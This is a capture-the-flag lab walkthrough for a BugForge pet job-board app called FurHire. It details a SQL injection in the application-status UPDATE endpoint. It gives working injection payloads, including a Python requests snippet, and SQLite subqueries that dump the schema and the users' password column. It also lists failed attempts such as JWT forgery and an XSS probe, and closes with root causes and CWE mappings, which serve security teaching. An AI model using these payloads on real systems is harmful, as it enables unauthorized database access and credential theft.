# furhire-007 - BugForge Lab Walkthrough

**URL:** https://lab-1786363229412-n2i5k3.labs-app.bugforge.io/
**Difficulty:** Medium
**Vulnerability:** SQL Injection (string concatenation in an UPDATE statement)
**Flag:** `bug{vt3CTt2cbv2L6MjNmfTAd4wIRZmwsEfr}`

---

## Summary

FurHire is a pet-recruitment job board (recruiters post jobs, job seekers apply). Recruiters
review applicants and set an application's status via `PUT /api/applications/:id/status`. The
server does not validate the `status` value against an allow-list (`pending`/`accepted`/`rejected`)
and interpolates it directly into a raw SQL `UPDATE` statement instead of using a parameterized
query. A single quote in the request body breaks out of the string literal, letting an attacker
splice in a `||` (SQLite string-concatenation) subquery that reads arbitrary data from any table
in the database. The exfiltrated value is written back into the same `status` column, which the
attacker (an authenticated recruiter, acting on their own job's own application) can then read
straight back out through the normal `GET /api/jobs/:id/applicants` endpoint. Blind/error-based
oracle not even needed - it's a full read primitive. The flag was stored as the literal value of
the `password` column for the seeded `admin` account (id 1) instead of a bcrypt hash.

## Tech Stack

- Express.js, server-rendered page shells with per-page inline `<script>` blocks (not a React SPA,
  no exposed source maps)
- SQLite backend, raw string-concatenated queries on at least the application-status endpoint
  (other endpoints appear parameterized/properly filtered - see Dead Ends)
- JWT in `localStorage`, `Authorization: Bearer` header
- Socket.io present for live notification toasts, connection is unauthenticated

## Key Endpoints

| Endpoint | Auth | Notes |
|---|---|---|
| `POST /api/register` | none | `role` accepted from body but server clamps unknown values to `user`; no email-format or username-content validation (accepts raw HTML in username/full_name, but every render path uses `escapeHtml`) |
| `POST /api/login` | none | |
| `GET/PUT /api/profile` | user | `resume_url` field exists in schema/response but is silently dropped on PUT (not a mass-assignment vector) |
| `PUT /api/company` | recruiter | `logo_url` field exists in schema/response but silently dropped on PUT |
| `POST /api/jobs` | recruiter | `company_id`/`recruiter_id` in body are ignored, derived server-side from the JWT - not exploitable |
| `GET /api/jobs/:id/applicants` | recruiter, ownership-checked | properly scoped to jobs the caller owns |
| `PUT /api/applications/:id/status` | recruiter, ownership-checked for row selection - **but the `status` value itself is raw-concatenated into the UPDATE SQL, no validation, no parameterization** | **the vulnerable endpoint** |
| `PUT /api/notifications/:id/read` | any authenticated user | no ownership check (any user can mark any other user's notification read) - low impact, no data returned, noted as secondary finding |

## Attack Chain

1. Register a recruiter account and a job-seeker account, complete onboarding for both:
   ```
   POST /api/register {"username":"bob_recruiter","email":"bob@evil.test","full_name":"Bob Recruiter","password":"Password123!","role":"recruiter"}
   PUT /api/company {"company_name":"Bob Pet Co","industry":"Pet Services","description":"We hire pets","location":"Pet City"}   (Authorization: Bearer <bob token>)

   POST /api/register {"username":"alice_seeker","email":"alice@evil.test","full_name":"Alice Seeker","password":"Password123!","role":"user"}
   PUT /api/profile {"bio":"...","location":"Pet City","years_experience":3,"skills":["Fetching"]}   (Authorization: Bearer <alice token>)
   ```

2. Post a job as the recruiter and apply to it as the job seeker, to get an `application.id`
   the recruiter is authorized to update:
   ```
   POST /api/jobs {"title":"Test Fetcher","description":"...","location":"Pet City","job_type":"Full-time","salary_range":"10,000 - 20,000","requirements":["Fetching"]}   -> {"id":5}
   POST /api/jobs/5/apply {"cover_letter":"I love fetching!"}   (Authorization: Bearer <alice token>)   -> application id=1
   ```

3. Confirm the injection point - a bare single quote in `status` breaks the query
   (`{"error":"Database error"}`), a doubled/escaped quote does not:
   ```
   PUT /api/applications/1/status {"status":"test'"}    -> 500 {"error":"Database error"}
   PUT /api/applications/1/status {"status":"test''"}   -> 200 OK
   ```

4. Confirm code execution/injection with a comment-terminated payload
   (`accepted' WHERE id=1--`) returning `200 OK` with no error - proves the injected SQL is
   syntactically valid and runs.

5. Build a blind-write-then-read oracle: set `status` to `' || (<subquery>) || '`. SQLite's `||`
   operator concatenates the subquery's result into the string literal without needing to comment
   out the trailing `WHERE` clause, so the update stays scoped to the one row the recruiter already
   owns - no collateral damage to other rows:
   ```python
   payload = "' || (SELECT sql FROM sqlite_master WHERE name='users') || '"
   requests.put(f"{TARGET}/api/applications/1/status", json={"status": payload},
                headers={"Authorization": f"Bearer {bob_token}"})
   # then read it back:
   requests.get(f"{TARGET}/api/jobs/5/applicants", headers=...)  # -> applicant[status] contains the schema text
   ```

6. Enumerate tables via `SELECT group_concat(name,',') FROM sqlite_master WHERE type='table'`:
   `users, sqlite_sequence, user_profiles, companies, jobs, applications, saved_jobs, notifications`.
   No dedicated `flags`/`secrets` table exists.

7. Dump `users.id, username, password`:
   ```
   SELECT group_concat(id||':'||password,' | ') FROM users WHERE id<=6
   ```
   Returns bcrypt hashes (`$2a$10$...`) for every seeded account **except id=1 (`admin`)**, whose
   `password` column is literally:
   ```
   bug{vt3CTt2cbv2L6MjNmfTAd4wIRZmwsEfr}
   ```
   That is the flag - it was never a real password hash, the seed data stores the flag directly
   in that column for the `admin` user.

8. Submit via the platform API - confirmed `{"correct": true}`.

## Discovery Notes

Phase 2 source audit found nothing (server-rendered shell, no source maps, `escapeHtml()` used
consistently on every dynamic render path I could find - jobs list, job detail, dashboard,
applicants list, my-applications). Standard IDOR/BFLA/mass-assignment sweep (Phase 4/5) came back
clean across every endpoint tried: applicant list, status update, job update, company profile,
job posting, profile update, notifications-by-id - the app enforces ownership correctly almost
everywhere.

The signal that broke it open was noticing `PUT /api/applications/:id/status` accepted an
**arbitrary string** for `status` with no server-side allow-list check (tested by sending an
`<img src=x onerror=...>` payload expecting to chain it into the unauthenticated Socket.io
`status_update` broadcast, which uses raw unescaped `innerHTML` client-side unlike every other
render path in the app - see Dead Ends). That payload update itself succeeded silently. Testing
a bare single quote in the same field immediately produced a raw `{"error":"Database error"}`
instead of a validation error, which is the classic tell for string-concatenated SQL - every other
tested endpoint returns a clean JSON validation error instead of a generic DB error, which is what
made this one endpoint stand out once probed directly.

## Dead Ends

| Attempt | Result | Lesson |
|---|---|---|
| `logo_url` mass-assignment on `PUT /api/company` (furhire-008 pattern) | Field silently dropped, stays `null` | This lab's `logo_url`/`website` fields exist in the schema but aren't SSRF-reachable; not every FurHire instance repeats the sibling lab's exact bug |
| `resume_url` mass-assignment on `PUT /api/profile` | Field silently dropped | Same as above |
| Cross-tenant IDOR on `GET /api/jobs/:id/applicants`, `PUT /api/applications/:id/status`, `PUT /api/jobs/:id` (3 separate accounts tested) | All properly return `unauthorized`/empty | Ownership checks are solid on every *other* endpoint |
| BFLA: job-seeker hitting recruiter-only endpoints and vice versa | Properly blocked with descriptive 403 errors | |
| `POST /api/register` with `role:"admin"` or `id:1` (account hijack) | Server clamps role to `user`, assigns a fresh auto-increment id | |
| JWT `alg:none` forgery, weak-secret HMAC brute force (33 common secrets) | Both rejected/no match | |
| Default creds `admin@furhire.com` / common passwords | `Invalid credentials` every time | Correct - the credential-stuffing precedent from furhire-009 doesn't apply here |
| `search`/`location`/`job_type` query params on `GET /api/jobs` | No error, no injection signal | These are parameterized (or use safely-quoted `LIKE`) even though the status field isn't - inconsistent hardening across the codebase, not a blanket SQLi-everywhere situation |
| Chaining the "no status validation" finding into a stored-XSS-via-Socket.io angle | The `new_application`/`status_update` broadcast `message` text is server-templated ("New application received for {job title}") and never includes the injected `status` value itself, so the raw-`innerHTML` `showToast()` sink was not reachable this way | The unvalidated field was still exploitable, just via SQLi instead of the XSS path I was chasing when I found it |
| `PUT /api/notifications/:id/read` cross-tenant | Succeeds for any id/any user, no ownership check | Real IDOR but no data is returned by the endpoint (just a success message) and no companion `GET /api/notifications/:id` route exists, so no disclosure - logged as a secondary low-impact finding, not the graded bug |
| Static-file path traversal on `/public/...` | 404 on every payload tried | |
| `/api/account/recover`, `/api/2fa/verify`, `/reporting`, `/internal`, admin panel guesses | All 404 | This instance doesn't reuse the furhire-014 NoSQL-recover pattern or the furhire-008 SSRF pattern |

## Root Causes

- **Raw string concatenation into a SQL `UPDATE` statement** for the `status` field, while every
  other write endpoint in the same codebase (`jobs`, `applications.cover_letter`, `profile`,
  `company`) appears to use parameterized queries - a single inconsistently-written query handler
  undoes the app's otherwise solid authorization model.
- **No allow-list validation** on `status` (should be restricted to `pending`/`accepted`/`rejected`)
  before the value ever reaches the query layer - defense in depth would have caught this even
  with the raw concatenation still present.
- **Generic error leakage**: a raw `{"error":"Database error"}` on a single-quote input is a strong
  fingerprint that told us exactly where to dig, versus a generic 400 the rest of the app returns
  for bad input.
- **Secrets stored in-band with production-shaped data**: the flag lives in the `users.password`
  column for a real seeded account rather than a dedicated out-of-band store, so any read primitive
  against `users` (this SQLi, or a future one) trivially discloses it.

## CWE / OWASP

- CWE-89: SQL Injection (primary)
- CWE-20: Improper Input Validation (missing `status` allow-list, the earlier layer that should
  have stopped this)
- OWASP Top 10 2021: A03:2021 - Injection
